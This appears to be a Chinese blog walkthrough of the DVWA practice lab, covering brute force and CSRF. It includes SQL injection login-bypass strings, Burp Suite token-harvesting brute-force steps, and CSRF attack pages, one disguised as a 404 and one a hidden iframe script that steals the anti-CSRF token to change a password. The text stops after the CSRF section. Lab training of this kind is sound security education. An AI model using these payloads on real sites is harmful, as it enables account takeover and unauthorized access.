<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>靶机练习|DVWA(上) | 他年少如歌</title><meta name="description" content="Burte Force(暴力破解)Low​        服务器只是有验证了参数Login是否被设置（isset函数再php中用来检测变量是否被设置，该函式返回的是布尔类型的值，即true&#x2F;false），没有任何防爆破机制，且对参数username，password没有做任何过滤，存在明显的sql注入漏洞。 漏洞利用 方法一：爆破利用burpsuit即可完成1、抓包2、将数据包发送到intrude"><meta name="keywords" content="网络安全"><meta name="author" content="他年少如歌"><meta name="copyright" content="他年少如歌"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://chakalake.gitee.io/posts/46837/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><meta property="og:type" content="article"><meta property="og:title" content="靶机练习|DVWA(上)"><meta property="og:url" content="https://chakalake.gitee.io/posts/46837/"><meta property="og:site_name" content="他年少如歌"><meta property="og:description" content="Burte Force(暴力破解)Low​        服务器只是有验证了参数Login是否被设置（isset函数再php中用来检测变量是否被设置，该函式返回的是布尔类型的值，即true&#x2F;false），没有任何防爆破机制，且对参数username，password没有做任何过滤，存在明显的sql注入漏洞。 漏洞利用 方法一：爆破利用burpsuit即可完成1、抓包2、将数据包发送到intrude"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/017.webp"><meta property="article:published_time" content="2020-07-12T05:05:19.000Z"><meta property="article:modified_time" content="2021-04-15T01:24:32.970Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="prev" title="Web安全|文件包含" href="https://chakalake.gitee.io/posts/52032/"><link rel="next" title="HTTP协议学习" href="https://chakalake.gitee.io/posts/2332/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: false,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: true,
  Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2021-04-15 09:24:32'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/Chocolate1999/cdn/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">42</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">3</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/bangumis/"><i class="fa-fw fab fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/box/"><i class="fa-fw fab fa-xbox"></i><span> 聚宝盒</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw far fa-comment"></i><span> 微语</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Burte-Force-暴力破解"><span class="toc-number">1.</span> <span class="toc-text">Burte Force(暴力破解)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low"><span class="toc-number">1.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium"><span class="toc-number">1.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HIgh"><span class="toc-number">1.3.</span> <span class="toc-text">HIgh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible"><span class="toc-number">1.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">2.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LOW"><span class="toc-number">2.1.</span> <span class="toc-text">LOW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-1"><span class="toc-number">2.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High"><span class="toc-number">2.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-1"><span class="toc-number">2.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-1"><span class="toc-number">3.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-2"><span class="toc-number">3.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-1"><span class="toc-number">3.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-2"><span class="toc-number">3.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-inclusion"><span class="toc-number">4.</span> <span class="toc-text">File inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-2"><span class="toc-number">4.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-3"><span class="toc-number">4.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-2"><span class="toc-number">4.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-3"><span class="toc-number">4.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Upload"><span class="toc-number">5.</span> <span class="toc-text">File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-3"><span class="toc-number">5.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-4"><span class="toc-number">5.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-3"><span class="toc-number">5.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-4"><span class="toc-number">5.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Insecure-CAPTCHA"><span class="toc-number">6.</span> <span class="toc-text">Insecure CAPTCHA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-4"><span class="toc-number">6.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-5"><span class="toc-number">6.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-4"><span class="toc-number">6.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-5"><span class="toc-number">6.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">7.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LOW-1"><span class="toc-number">7.1.</span> <span class="toc-text">LOW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-6"><span class="toc-number">7.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-5"><span class="toc-number">7.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-6"><span class="toc-number">7.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Blind"><span class="toc-number">8.</span> <span class="toc-text">SQL Injection(Blind)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LOW-2"><span class="toc-number">8.1.</span> <span class="toc-text">LOW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-7"><span class="toc-number">8.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-6"><span class="toc-number">8.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-7"><span class="toc-number">8.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/017.webp)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">他年少如歌</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/bangumis/"><i class="fa-fw fab fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/box/"><i class="fa-fw fab fa-xbox"></i><span> 聚宝盒</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw far fa-comment"></i><span> 微语</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">靶机练习|DVWA(上)</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-07-12 13:05:19"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2020-07-12</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2021-04-15 09:24:32"><i class="fas fa-history fa-fw"></i> 更新于 2021-04-15</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">靶机练习</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="Burte-Force-暴力破解"><a href="#Burte-Force-暴力破解" class="headerlink" title="Burte Force(暴力破解)"></a>Burte Force(暴力破解)</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>​        服务器只是有验证了参数Login是否被设置（isset函数再php中用来检测变量是否被设置，该函式返回的是布尔类型的值，即true/false），没有任何防爆破机制，且对参数username，password没有做任何过滤，存在明显的sql注入漏洞。</p>
<p>漏洞利用</p>
<p>方法一：爆破利用burpsuit即可完成<br>1、抓包<br>2、将数据包发送到intruder模块，将password参数设置为变量<br>3、选中payload，载入字典，点击start attack进行爆破<br>4、最后，尝试在爆破结果中找到正确的密码，可以看到password（正确密码）的响应长度（lehgth）与其他值不同，可以推测password为正确密码。</p>
<p>方法二：手工sql注入<br>1、Username：admin’ or ‘1’=’1<br>Password：（空）<br>2、Username：admin’ #<br>Password：（空）</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>​        Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00、n、r、’、”、x1a、\）进行转义，基本上能够抵御sql注入攻击，说基本上是因为MySQL5.5.37以下版本如果设置编码GBK，能够构造编码绕过mysql_real_escape_string对单引号的转义；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）。<br>具体的mysql_real_escape_string函数绕过问题详见<br><a href="http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html" target="_blank" rel="noopener">http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html</a></p>
<p>漏洞利用</p>
<p>​        虽然sql注入不再有效，但依然可以用Burpsuit进行爆破，与Low级别的爆破方式基本一样。</p>
<h2 id="HIgh"><a href="#HIgh" class="headerlink" title="HIgh"></a>HIgh</h2><p>​        High的级别加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到登录验证时提交了四个参数：username，password，Login以及user_token。<br>​        每次服务器返回的登录页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。<br>​        同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符，如果有两个连续的反斜线，则只去掉一个）、mysql_real_escape_string对参数username，password进行过滤、转义，进一步抵御sql注入。</p>
<p>漏洞利用</p>
<p>方法一：利用burpsuit获取user_token进行密码爆破<br>1、开启burpsuite抓包<br>2、将抓取到的数据包通过右键选择“send to Intruder”发送至Intruder<br>3、将Attach type设置为pitch fork（草叉模式），为password和user_token值添加payload标志。<br>4、在Options选项找到Grep-Extract，选择Extract the following items from reponse，点击Add<br>5、在弹出的窗口中选择user_token的值，点击OK（注意保存该user_token的值，接下来将设置该值为初始参数值）<br>6、在Options中，在Request Engine中将Number of threads值设为1<br>7、为payload1（password值）添加攻击载荷<br>8、为payload2（user_token值）设置攻击载荷：将payload type设为Recursive grep，并为initial payload for first request填入参数值（即刚才保存的user_token值）<br>9、点击Start attack开始攻击，攻击成功</p>
<p>注意：<br>上一次访问得到的token作为了本次请求的参数。这里注意到前几个元素不正常，这是因为burp每次开启爆破任务都要进行payload空负载请求。这导致字典的第一个元素将得不到合适的token，如果密码恰巧在第一个就白忙活了。</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>​        impossible级别的代码加入了可靠的防爆破机制，当检测到频繁错误登录后，系统会将账户锁定，爆破也就无法继续。<br>​        同时采用了更为安全的PDO（PHP Data Object）机制抵御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查cookie，只是这里的代码没有体现）。</p>
<p>漏洞利用</p>
<p>1、构造链接<br>（1）最基础的：<br><code>http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code><br>当受害者点击这个链接，它的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）。<br>需要注意的是，CSRF最关键 的是利用受害者cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用火狐浏览器点击这个链接，攻击是不会出发的，因为火狐浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录页面。<br>（2）可以使用短链接隐藏URL（点击短链接会自动跳转到真实网站）：<br><code>http://dwz.cn/****</code><br>在靶机测试中，由于是本地搭的环境，服务器域名是ip，所以无法生相应的短链接，实际攻击场景下只要目标服务器的域名不是ip，就可以生成相应的短链接。<br>需要提醒的是，虽然利用短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也不高明。<br>（3）构造攻击页面：<br>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示，在本地写一个test.html。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/?</span></span></span><br><span class="line"><span class="tag"><span class="string">password_new=admin123&amp;password_conf=admin123&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当受害这访问test.html时，会误认为自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p>
<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>相关函数说明：</p>
<p>int rergi(string pattern,string string)<br>检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。<br>可以看到，Medium级别的代码检查了保留变量HTTP_REFE11RER（http包头中的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名）</p>
<p>漏洞利用：</p>
<p>过滤规则是http包头中Referer参数的值中必须包含主机名(这里是127.0.0.1)，我们可以将攻击页面命名为127.0.0.1.html(页面被放置在攻击者的服务器里，这里是192.168.8.20)就可以绕过了。<br><code>http://192.168.8.20/127.0.0.1.html</code></p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>High级别的代码加入了Anti-CSRF-token机制，用户每次访问改密码时，服务器会返回一个随机的token，向服务器发送请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<p>漏洞利用：</p>
<p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。<br>试着构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span></span></span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"><span class="javascript">   <span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value=<span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit(); </span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/csrf"</span> <span class="attr">id</span>=<span class="string">"hack"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"attack()"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/csrf"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

